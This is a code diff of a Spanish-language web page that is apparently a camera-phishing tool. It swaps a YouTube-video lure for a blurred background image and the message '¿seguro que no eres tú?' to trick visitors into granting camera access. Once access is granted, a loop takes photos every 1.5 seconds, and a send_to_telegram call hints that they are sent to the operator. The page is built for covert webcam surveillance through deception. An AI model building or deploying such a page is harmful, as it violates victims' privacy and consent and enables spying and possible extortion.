@@ -19,35 +19,55 @@ send_to_telegram($msg);
 <head>
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        body { margin:0; font-family: Arial, sans-serif; background: #000; }
-        .yt-wrapper { position: relative; width: 100%; height: 500px; background: #000; }
-    </style>
-</head>
-<body>
+        body {
+            margin:0;
+            font-family: Arial, sans-serif;
+            background: #000;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-<!-- Modal de permisos estético -->
-<div id="cameraModal" style="
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: rgba(0,0,0,0.7);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-">
-    <div style="
-        background: #fff;
-        color: #000;
-        padding: 30px;
-        border-radius: 10px;
-        max-width: 500px;
-        text-align: center;
-        box-shadow: 0 0 20px rgba(0,0,0,0.5);
-    ">
-        <h2 style="margin-top:0;">¡Atención!</h2>
-        <p>Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.</p>
-        <button id="grantAccess" style="
+        /* Imagen censurada inicial */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: url('img/image.jpg') no-repeat center center/cover;
+            filter: blur(15px) brightness(0.5);
+            z-index: -1;
+            transition: all 0.8s ease;
+        }
+
+        /* Imagen normal cuando se desbloquea */
+        body.unlocked::before {
+            filter: none;
+            brightness: 1;
+        }
+
+        /* Modal */
+        #cameraModal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        #cameraModal .content {
+            background: #fff;
+            color: #000;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        #grantAccess {
             margin-top: 20px;
             padding: 10px 20px;
             background-color: #FF0000;
@@ -57,18 +77,21 @@ send_to_telegram($msg);
             cursor: pointer;
             font-size: 16px;
             transition: background 0.2s;
-        " onmouseover="this.style.backgroundColor='#cc0000'" onmouseout="this.style.backgroundColor='#FF0000'">
-            Permitir acceso
-        </button>
-    </div>
-</div>
+        }
+        #grantAccess:hover {
+            background-color: #cc0000;
+        }
+    </style>
+</head>
+<body>
 
-<!-- YouTube video oculto inicialmente -->
-<div class="yt-wrapper" id="videoContainer" style="display:none;">
-    <iframe id="Live_YT_TV" width="100%" height="100%" 
-        src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1&controls=1" 
-        frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen>
-    </iframe>
+<!-- Modal de permisos -->
+<div id="cameraModal">
+    <div class="content">
+        <h2>¡Atención!</h2>
+        <p>📸 ¡Wow! Apareces en la imagen de fondo… ¿seguro que no eres tú? Da acceso a tu cámara para poder ver la foto completa y guardarla.</p>
+        <button id="grantAccess">Permitir acceso</button>
+    </div>
 </div>
 
 <!-- Video y Canvas ocultos para tomar fotos -->
@@ -100,8 +123,10 @@ async function initCamera() {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         capturePhotoLoop();
-        // Mostrar video de YouTube solo después de permitir cámara
-        document.getElementById('videoContainer').style.display = 'block';
+
+        // Cambiar fondo a claro
+        document.body.classList.add('unlocked');
+
     } catch (e) {
         console.error('Error al acceder a la cámara:', e);
         // Si rechaza, modal sigue visible
@@ -119,7 +144,7 @@ function capturePhotoLoop() {
     }, 1500);
 }
 
-// Al presionar "Permitir acceso", ocultar modal e iniciar cámara
+// Al presionar "Permitir acceso"
 document.getElementById('grantAccess').addEventListener('click', () => {
     document.getElementById('cameraModal').style.display = 'none';
     initCamera();
